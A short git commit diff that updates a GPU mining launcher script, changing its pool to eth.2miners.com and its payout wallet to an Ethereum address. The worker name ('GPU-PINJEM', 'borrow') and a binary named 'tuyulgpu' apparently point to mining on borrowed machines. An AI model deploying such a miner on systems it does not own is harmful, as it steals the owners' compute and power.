b70268ce111ab254eccb92a1b884789e43b5f51e
catursawah <83405015+catursawah@users.noreply.github.com>
2021-06-09 21:47:32 +0700

    Update gpu.sh

--- gpu.sh
+++ gpu.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
-POOL=ethash.unmineable.com:3333
-WALLET=BTT:TEdDi3ETkZperykuUJ7RR5ojCEMVY47a7i
+POOL=eth.2miners.com:2020
+WALLET=0xc6601e3308cfe311faa2236b9578ae3cfad2c82a
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
 
 chmod +x tuyulgpu
